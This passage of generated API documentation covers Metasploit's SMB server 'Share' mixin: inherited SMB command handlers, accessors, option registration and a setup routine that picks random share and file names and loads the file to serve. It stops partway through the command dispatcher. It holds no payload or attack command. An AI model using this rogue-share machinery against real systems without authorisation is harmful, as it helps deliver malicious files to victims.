  <p class="inherited"><span class='object_link'><a href="Share/InformationLevel/Find.html#send_find_file_both_directory_info_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find#send_find_file_both_directory_info_res (method)">#send_find_file_both_directory_info_res</a></span>, <span class='object_link'><a href="Share/InformationLevel/Find.html#send_find_file_names_info_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find#send_find_file_names_info_res (method)">#send_find_file_names_info_res</a></span>, <span class='object_link'><a href="Share/InformationLevel/Find.html#send_find_full_directory_info_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find#send_find_full_directory_info_res (method)">#send_find_full_directory_info_res</a></span>, <span class='object_link'><a href="Share/InformationLevel/Find.html#smb_cmd_find_file_both_directory_info-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find#smb_cmd_find_file_both_directory_info (method)">#smb_cmd_find_file_both_directory_info</a></span>, <span class='object_link'><a href="Share/InformationLevel/Find.html#smb_cmd_find_file_full_directory_info-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find#smb_cmd_find_file_full_directory_info (method)">#smb_cmd_find_file_full_directory_info</a></span>, <span class='object_link'><a href="Share/InformationLevel/Find.html#smb_cmd_find_file_names_info-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find#smb_cmd_find_file_names_info (method)">#smb_cmd_find_file_names_info</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/Trans2/QueryPathInformation.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::QueryPathInformation (module)">Command::Trans2::QueryPathInformation</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/Trans2/QueryPathInformation.html#smb_cmd_trans2_query_path_information-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::QueryPathInformation#smb_cmd_trans2_query_path_information (method)">#smb_cmd_trans2_query_path_information</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/Trans2/QueryFileInformation.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::QueryFileInformation (module)">Command::Trans2::QueryFileInformation</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/Trans2/QueryFileInformation.html#smb_cmd_trans2_query_file_information-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::QueryFileInformation#smb_cmd_trans2_query_file_information (method)">#smb_cmd_trans2_query_file_information</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/Trans2/FindFirst2.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::FindFirst2 (module)">Command::Trans2::FindFirst2</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/Trans2/FindFirst2.html#smb_cmd_trans2_find_first2-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::FindFirst2#smb_cmd_trans2_find_first2 (method)">#smb_cmd_trans2_find_first2</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/Trans2.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2 (module)">Command::Trans2</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/Trans2.html#normalize_path-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2#normalize_path (method)">#normalize_path</a></span>, <span class='object_link'><a href="Share/Command/Trans2.html#send_trans2_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2#send_trans2_res (method)">#send_trans2_res</a></span>, <span class='object_link'><a href="Share/Command/Trans2.html#smb_cmd_trans2-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2#smb_cmd_trans2 (method)">#smb_cmd_trans2</a></span>, <span class='object_link'><a href="Share/Command/Trans2.html#smb_expand-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2#smb_expand (method)">#smb_expand</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/SessionSetupAndx.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::SessionSetupAndx (module)">Command::SessionSetupAndx</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/SessionSetupAndx.html#send_session_setup_andx_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::SessionSetupAndx#send_session_setup_andx_res (method)">#send_session_setup_andx_res</a></span>, <span class='object_link'><a href="Share/Command/SessionSetupAndx.html#smb_cmd_session_setup_andx-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::SessionSetupAndx#smb_cmd_session_setup_andx (method)">#smb_cmd_session_setup_andx</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/ReadAndx.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::ReadAndx (module)">Command::ReadAndx</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/ReadAndx.html#send_read_andx_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::ReadAndx#send_read_andx_res (method)">#send_read_andx_res</a></span>, <span class='object_link'><a href="Share/Command/ReadAndx.html#smb_cmd_read_andx-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::ReadAndx#smb_cmd_read_andx (method)">#smb_cmd_read_andx</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/NtCreateAndx.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::NtCreateAndx (module)">Command::NtCreateAndx</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/NtCreateAndx.html#send_nt_create_andx_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::NtCreateAndx#send_nt_create_andx_res (method)">#send_nt_create_andx_res</a></span>, <span class='object_link'><a href="Share/Command/NtCreateAndx.html#smb_cmd_nt_create_andx-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::NtCreateAndx#smb_cmd_nt_create_andx (method)">#smb_cmd_nt_create_andx</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/Negotiate.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Negotiate (module)">Command::Negotiate</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/Negotiate.html#send_negotitate_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Negotiate#send_negotitate_res (method)">#send_negotitate_res</a></span>, <span class='object_link'><a href="Share/Command/Negotiate.html#smb_cmd_negotiate-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Negotiate#smb_cmd_negotiate (method)">#smb_cmd_negotiate</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/Close.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Close (module)">Command::Close</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/Close.html#send_close_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Close#send_close_res (method)">#send_close_res</a></span>, <span class='object_link'><a href="Share/Command/Close.html#smb_cmd_close-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Close#smb_cmd_close (method)">#smb_cmd_close</a></span></p>

  <div id="instance_attr_details" class="attr_details">
    <h2>Instance Attribute Details</h2>
    
      
      <span id="file_contents=-instance_method"></span>
      <div class="method_details first">
  <h3 class="signature first" id="file_contents-instance_method">
  
    #<strong>file_contents</strong>  &#x21d2; <tt>String</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns The contents of the provided file.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The contents of the provided file</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


182
183
184</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/remote/smb/server/share.rb', line 182</span>

<span class='kw'>def</span> <span class='id identifier rubyid_file_contents'>file_contents</span>
  <span class='ivar'>@file_contents</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="file_name=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="file_name-instance_method">
  
    #<strong>file_name</strong>  &#x21d2; <tt>String</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns The file name of the provided UNC.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The file name of the provided UNC.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


173
174
175</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/remote/smb/server/share.rb', line 173</span>

<span class='kw'>def</span> <span class='id identifier rubyid_file_name'>file_name</span>
  <span class='ivar'>@file_name</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="folder_name=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="folder_name-instance_method">
  
    #<strong>folder_name</strong>  &#x21d2; <tt>String</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns The folder where the provided file lives.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The folder where the provided file lives.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


170
171
172</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/remote/smb/server/share.rb', line 170</span>

<span class='kw'>def</span> <span class='id identifier rubyid_folder_name'>folder_name</span>
  <span class='ivar'>@folder_name</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="hi=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="hi-instance_method">
  
    #<strong>hi</strong>  &#x21d2; <tt>Integer</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns The high 4 bytes for the file &#39;created time&#39;.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>Integer</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The high 4 bytes for the file &#39;created time&#39;.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


176
177
178</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/remote/smb/server/share.rb', line 176</span>

<span class='kw'>def</span> <span class='id identifier rubyid_hi'>hi</span>
  <span class='ivar'>@hi</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="lo=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="lo-instance_method">
  
    #<strong>lo</strong>  &#x21d2; <tt>Integer</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns The low 4 bytes for the file &#39;created time&#39;.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>Integer</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The low 4 bytes for the file &#39;created time&#39;.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


179
180
181</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/remote/smb/server/share.rb', line 179</span>

<span class='kw'>def</span> <span class='id identifier rubyid_lo'>lo</span>
  <span class='ivar'>@lo</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="share=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="share-instance_method">
  
    #<strong>share</strong>  &#x21d2; <tt>String</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns The share portion of the provided UNC.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The share portion of the provided UNC.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


167
168
169</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/remote/smb/server/share.rb', line 167</span>

<span class='kw'>def</span> <span class='id identifier rubyid_share'>share</span>
  <span class='ivar'>@share</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>


  <div id="instance_method_details" class="method_details_list">
    <h2>Instance Method Details</h2>

    
      <div class="method_details first">
  <h3 class="signature first" id="get_file_contents-instance_method">
  
    #<strong>get_file_contents</strong>(client:, file: &#39;&#39;, folder: &#39;&#39;)  &#x21d2; <tt>String</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
  <div class="note notetag">
    <strong>Note:</strong>
    <div class='inline'>
<p>This method will be useful when multiple files are supported. At the moment is used to be overriden by modules. So they can customize the file contents.</p>
</div>
  </div>


<p>Returns the file contents for the requested file</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>file</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
        <em class="default">(defaults to: <tt>&#39;&#39;</tt>)</em>
      
      
        &mdash;
        <div class='inline'>
<p>the requested file</p>
</div>
      
    </li>
  
    <li>
      
        <span class='name'>folder</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
        <em class="default">(defaults to: <tt>&#39;&#39;</tt>)</em>
      
      
        &mdash;
        <div class='inline'>
<p>the requested folder</p>
</div>
      
    </li>
  
</ul>

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The file contents.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


234
235
236</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/remote/smb/server/share.rb', line 234</span>

<span class='kw'>def</span> <span class='id identifier rubyid_get_file_contents'>get_file_contents</span><span class='lparen'>(</span><span class='label'>client:</span><span class='comma'>,</span> <span class='label'>file:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='label'>folder:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
  <span class='id identifier rubyid_file_contents'>file_contents</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="initialize-instance_method">
  
    #<strong>initialize</strong>(info = {})  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


184
185
186
187
188
189
190
191
192
193
194</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/remote/smb/server/share.rb', line 184</span>

<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
  <span class='kw'>super</span>

  <span class='id identifier rubyid_register_options'>register_options</span><span class='lparen'>(</span>
    <span class='lbracket'>[</span>
      <span class='const'><span class='object_link'><a href="../../../../OptString.html" title="Msf::OptString (class)">OptString</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../../../OptString.html#initialize-instance_method" title="Msf::OptString#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHARE</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Share (Default Random)</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
      <span class='const'><span class='object_link'><a href="../../../../OptString.html" title="Msf::OptString (class)">OptString</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../../../OptString.html#initialize-instance_method" title="Msf::OptString#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FILE_NAME</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>File name to share (Default Random)</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
      <span class='const'><span class='object_link'><a href="../../../../OptString.html" title="Msf::OptString (class)">OptString</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../../../OptString.html#initialize-instance_method" title="Msf::OptString#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FOLDER_NAME</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Folder name to share (Default none)</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
      <span class='const'><span class='object_link'><a href="../../../../OptPath.html" title="Msf::OptPath (class)">OptPath</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../../../OptBase.html#initialize-instance_method" title="Msf::OptBase#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FILE_CONTENTS</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>File contents (Default Random)</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
    <span class='rbracket'>]</span><span class='comma'>,</span> <span class='const'><span class='object_link'><a href="../../../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../../Exploit.html" title="Msf::Exploit (class)">Exploit</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Remote.html" title="Msf::Exploit::Remote (class)">Remote</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../SMB.html" title="Msf::Exploit::Remote::SMB (module)">SMB</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../Server.html" title="Msf::Exploit::Remote::SMB::Server (module)">Server</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="" title="Msf::Exploit::Remote::SMB::Server::Share (module)">Share</a></span></span><span class='rparen'>)</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="setup-instance_method">
  
    #<strong>setup</strong>  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Setups the server configuration.</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/remote/smb/server/share.rb', line 197</span>

<span class='kw'>def</span> <span class='id identifier rubyid_setup'>setup</span>
  <span class='kw'>super</span>

  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_folder_name'>folder_name</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FOLDER_NAME</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_share'>share</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHARE</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='const'><span class='object_link'><a href="../../../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='int'>4</span> <span class='op'>+</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>3</span><span class='rparen'>)</span><span class='rparen'>)</span>
  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_file_name'>file_name</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FILE_NAME</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='const'><span class='object_link'><a href="../../../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='int'>4</span> <span class='op'>+</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>3</span><span class='rparen'>)</span><span class='rparen'>)</span>

  <span class='id identifier rubyid_t'>t</span> <span class='op'>=</span> <span class='const'>Time</span><span class='period'>.</span><span class='id identifier rubyid_now'>now</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span>
  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_hi'>hi</span><span class='comma'>,</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_lo'>lo</span> <span class='op'>=</span> <span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../../../Rex/Proto.html" title="Rex::Proto (module)">Proto</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../../../Rex/Proto/SMB.html" title="Rex::Proto::SMB (module)">SMB</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../../../Rex/Proto/SMB/Utils.html" title="Rex::Proto::SMB::Utils (class)">Utils</a></span></span><span class='period'>.</span><span class='id identifier rubyid_time_unix_to_smb'><span class='object_link'><a href="../../../../../Rex/Proto/SMB/Utils.html#time_unix_to_smb-class_method" title="Rex::Proto::SMB::Utils.time_unix_to_smb (method)">time_unix_to_smb</a></span></span><span class='lparen'>(</span><span class='id identifier rubyid_t'>t</span><span class='rparen'>)</span>

  <span class='comment'># The module has an opportunity to set up the file contents in the &quot;primer callback&quot;
</span>  <span class='kw'>if</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FILE_CONTENTS</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
    <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_open'>open</span><span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FILE_CONTENTS</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>rb</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_f'>f</span><span class='op'>|</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_file_contents'>file_contents</span> <span class='op'>=</span> <span class='id identifier rubyid_f'>f</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span> <span class='rbrace'>}</span>
  <span class='kw'>else</span>
    <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_file_contents'>file_contents</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='int'>50</span> <span class='op'>+</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>150</span><span class='rparen'>)</span><span class='rparen'>)</span>
  <span class='kw'>end</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="smb_cmd_dispatch-instance_method">
  
    #<strong>smb_cmd_dispatch</strong>(cmd, c, buff)  &#x21d2; <tt>Integer</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Main dispatcher function. Takes the client data and performs a case switch on the command (e.g. Negotiate, Session Setup, Read file, etc.)</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>cmd</span>
      
      
        <span class='type'>(<tt>Integer</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The SMB Command requested.</p>
</div>
      
    </li>
  
    <li>
      
        <span class='name'>c</span>
      
      
        <span class='type'>(<tt>Socket</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The client to answer.</p>
</div>
      
    </li>
  
    <li>
      
        <span class='name'>buff</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The data including the client request.</p>
</div>
      
    </li>
  
</ul>

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>Integer</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The number of bytes returned to the client as response.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/remote/smb/server/share.rb', line 268</span>

<span class='kw'>def</span> <span class='id identifier rubyid_smb_cmd_dispatch'>smb_cmd_dispatch</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd'>cmd</span><span class='comma'>,</span> <span class='id identifier rubyid_c'>c</span><span class='comma'>,</span> <span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_smb'>smb</span> <span class='op'>=</span> <span class='ivar'>@state</span><span class='lbracket'>[</span><span class='id identifier rubyid_c'>c</span><span class='rbracket'>]</span>

  <span class='id identifier rubyid_pkt'>pkt</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_BASE_PKT</span><span class='period'>.</span><span class='id identifier rubyid_make_struct'>make_struct</span>
  <span class='id identifier rubyid_pkt'>pkt</span><span class='period'>.</span><span class='id identifier rubyid_from_s'>from_s</span><span class='lparen'>(</span><span class='id identifier rubyid_buff'>buff</span><span class='rparen'>)</span>
  <span class='comment'>#Record the IDs
</span>  <span class='id identifier rubyid_smb'>smb</span><span class='lbracket'>[</span><span class='symbol'>:process_id</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_pkt'>pkt</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SMB</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_v'>v</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ProcessID</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
